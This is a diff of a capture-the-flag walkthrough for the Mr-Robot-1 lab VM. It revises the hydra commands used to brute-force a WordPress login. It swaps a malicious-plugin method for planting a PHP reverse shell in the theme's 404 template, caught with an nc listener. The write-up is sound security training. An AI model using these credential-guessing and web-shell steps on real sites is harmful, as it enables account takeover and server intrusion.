@@ -22,6 +22,8 @@ By Leon Johnson
 ![](/screenshots/mr-robot-1/uniscanResults.jpg)
 * Note: In the previous walkthrough on basic-pentesting-1, we used `dirbuster`, but here we are using `uniscan` which has other kinds of checks such as static and dynamic ones that the former does not have.
 * From the scan results, we see that the site is running on WordPress, since the directory checks included links that ended with `wp-`.
+* Note: I did another run of this using one of `nmap`'s options, i.e. `-script=http-enum` which turned out to work similarly with `dirbuster` and `uniscan` (though I do find it easier on the eyes when running through the scan results of the latter 2):
+![](/screenshots/mr-robot-1/nmapFurtherEnumResults.jpg)
 * There is a robots.txt found from the scan's file checks. Open it and we see that there are 2 files listed: `fsocity.dic` and `key-1-of-3.txt`. The former is an unordered dictionary wordlist, while the latter reveals a string: `073403c8a58a1f80d943455fb30724b9`.
 * It is likely that the dictionary file will be required for some sort of bruteforce attack later.
 * We are not quite sure if there is anything more to the string, but since it looks like a hash value, we will run `hash-identifier` against it:
@@ -37,25 +39,27 @@ By Leon Johnson
 * Note: The walkthrough [here](https://www.youtube.com/watch?v=1-a-P1Q2AnA&t=322s) on YouTube shows that there is a post on the WordPress site, with the user `elliot`. The author of the vulnerable VM is likely to have removed this only post for the latest version.
 * Run `wpscan --url 10.0.2.5 --enumerate u`, a black box WordPress vulnerability scanner, to see if we can obtain any usernames of accounts on the WordPress site:
 ![](/screenshots/mr-robot-1/wpScanUsers.jpg)
-* Interestingly, we have no user results found (*which I am not sure why*).
+* Interestingly, we have no user results found (*which I am not sure why*), as compared to the walkthroughs of some whom I viewed that had 2 users being found - `elliot` and `mich05654`.
 * I guess this is where we have to use the dictionary wordlist that we had found earlier to find a valid username.
-* We will run `hydra -V -L fsocity.dic -p testpassword 10.0.2.5 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username'`, where hydra is a parallelized login cracker which supports numerous protocols to attack:
+* We will run `hydra -L fsocity.dic -p testpassword 10.0.2.5 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username'`, where hydra is a parallelized login cracker which supports numerous protocols to attack:
 ![](/screenshots/mr-robot-1/hydraUsername.jpg)
-* An exisiting WordPress username (`Elliot`) was found almost immediately after the cracker started its run, i.e. the username was found near the top of the dictionary list.
+* A WordPress username (`Elliot`) was found almost immediately after the cracker started its run, i.e. the username was found near the top of the dictionary list.
+* I left the tool to run around 15 minutes before suspending it, at which point it returned with 3 positive results where all of them were variations of the word `elliot`. They differed only in terms of case-sensitivity.
+* Note: Usernames for WordPress sites are **case-insensitive**, i.e. logging in as user `Elliot` is considered the same as logging in as user `elliot`.
+* Note: The wordlist is a huge file, and since we have already got one positive username result so far, we will first work on seeing what kind of permissions user `elliot` is granted and suspend `hydra` for now.
 
 Explanation of how the `hydra` command works:
-* `-V`: show login (username) and password for each attempt (can be omitted, will display only the valid username once found; however, if you want to see that hydra is doing its work, include this parameter).
-* `-p testpassword`: we are not trying to crack passwords of a known user here so instead of testpassword, you can insert any random string as the password.
+* `-p testpassword`: we are not trying to crack passwords of a known user here - so instead of testpassword, you can insert any random string as the password.
+* (optional) `-V`: show login (username) and password for each attempt - if you want to see hydra doing its work, include this perimeter (else, will display only valid results once found).
 * In the parameters after specifying the protocol (`http-post-form`) to use, we insert 3 more parameters: the link to the login site, where the username and password which hydra will test will go, and how to determine the success/failure of each attempt.
 * To find out where the login credentials will go, we have to open the page source of the login form and take the `name` attribute values for the username and password input fields respectively:
 ![](/screenshots/mr-robot-1/loginFormPageSource.jpg)
 * Next, we need to find a string that distinguishes between a success/failure case. In this case, `Invalid username` is what hydra will see in most of its attempts, and it will flag those outcomes with this particular substring in its results as failed cases.
 * Note: We cannot use the string `Error` to distinguish because even if we get a valid username, the page will still flag it as a negative result because the result page will still contain an error message, since the password is incorrect. Thus, we will only get negatives from the hydra scan.
-* Having found an existing username `Elliot` for the WordPress site, our next step is to brute-force the password for that account.
-* Note: The username is **case-insensitive** in our case, i.e. you can login as user `elliot` as well, which is considered the same as `Elliot`.
+* Having found an existing username `elliot` for the WordPress site, our next step is to brute-force the password for that account.
 
 # Brute-force elliot's password using hydra #
-* We will similarly use `hydra` to brute-force the password for user Elliot. However, before we begin the brute-forcing process, we have to realise that there are 858,160 lines in the dictionary wordlist (run `wc -l fsocity.dic` to find out), which means that hydra will try a total of 858,160 passwords.
+* We will similarly use `hydra` to brute-force the password for user `elliot`. However, before we begin the brute-forcing process, we have to realise that there are 858,160 lines in the dictionary wordlist (run `wc -l fsocity.dic` to find out), which means that hydra will try a total of 858,160 passwords.
 * During the first 1 minute, hydra made around 1,100 attempts on my Kali VM (with the additional parameters of `-t 40 -w 1`: 40 connects in parallel and maximum 1 second wait for responses). The worst-case scenario of trying every single line as a password is that it would take around 12 hours to crack the password, which is way too long.
 * Let us examine the dictionary wordlist to see if we are able to reduce the number of attempts that we have to make in the worst-case scenario.
 * There might be duplicates in the wordlist, so we will sort the list first, then remove the duplicates: `cat fsocity.dic | sort | uniq > fsocity2.dic`. After doing so, we see that there are now only 11,451 lines within the modified wordlist (fsocity2.dic), which is just 1+% of the original wordlist. We are very much likely to get the password in under 10 minutes this time.
@@ -72,11 +76,19 @@ Explanation of how the `hydra` command works:
 
 * Besides the many repetitions in the orginal list, the password is also found somewhere at the end of the file, thus it took quite some time to get it.
 * After logging in as elliot, we find that we are able to see the full panel on the left-hand side of the wp-admin page. To confirm that we have full access to the site, we check `Users`, and find that elliot indeed has administrator privileges.
-* We will install and use the `malicious-wordpress-plugin` by `wetw0rk` [(GitHub link)](https://github.com/wetw0rk/malicious-wordpress-plugin), as we did in [basic-pentesting-1](https://github.com/leegengyu/CTF-Walkthrough/blob/master/basic-pentesting-1.md).
-* Run `python wordpwn.py 10.0.2.15 4000 Y` after cloning the repository, upload `malicious.zip` as a plugin, and then activate it.
-* Next, head to `10.0.2.5/wp-content/plugins/malicous/wetw0rk_maybe.php` on our browser to connect to the reverse shell.
-* Heading back to our Kali terminal, we see that a meterpreter session has been opened.
-* Navigate to our `home` directory and we find a directory called `robot`. Enter robot and we find key-2-of-3.txt and password.raw-md5:
+
+* We had used the `malicious-wordpress-plugin` in [basic-pentesting-1](https://github.com/leegengyu/CTF-Walkthrough/blob/master/basic-pentesting-1.md), so we will try another way to get a reverse shell, i.e. a non-plugin way.
+* Head to `/usr/share/webshells/php` and open `php-reverse-shell.php`. This file contains code that will give us our reverse shell.
+* Note: Alternatively, we can also use [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) by pentestmonkey through their Git repository by cloning it, though what is on GitHub is exactly the same as the one on our Kali VM.
+* Change the values at lines 49 and 50, which should hold the IP address (`$ip`) and port number (`$port`) of our Kali VM respectively.
+* Note: Use `ifconfig` to find out the former and just insert any number that you would like for the latter, so long as it is not already being used by another service. I will be using port 3000 here.
+* After editing the 2 values, copy and paste the entire code into `404 Template (404.php)`, which can be found by heading to `Appearance`, then `Editor`, and selecting the first file on the top-right hand corner of the page:
+![](/screenshots/mr-robot-1/reverseShellCodeUpload.jpg)
+* Once done, click `Update File`. Next, set up our `nc` listener before we launch the reverse shell: `nc -l -p 3000`.
+* Finally, we need to visit an invalid/non-existent page on the WordPress site, e.g. `http://10.0.2.5/hello`.
+* Heading back to our Kali terminal, we see that we have now got our reverse shell, as user `daemon`:
+![](/screenshots/mr-robot-1/reverseShellSuccessful.jpg)
+* Navigate to the `home` directory and we find a directory called `robot`. Enter robot and we find key-2-of-3.txt and password.raw-md5:
 ![](/screenshots/mr-robot-1/robotDirectory.jpg)
 * The key text file cannot be opened by us at the moment because the file is only readable by root, with no other permissions set. However, the password.raw-md5 file can be opened by us.
 * We find the string `robot:c3fcd3d76192e4007dfb496cca67e13b` within the .raw-md5 file. The string is likely to mean that there is a username `robot` and password MD5 hash pair `c3fcd3d76192e4007dfb496cca67e13b`. 
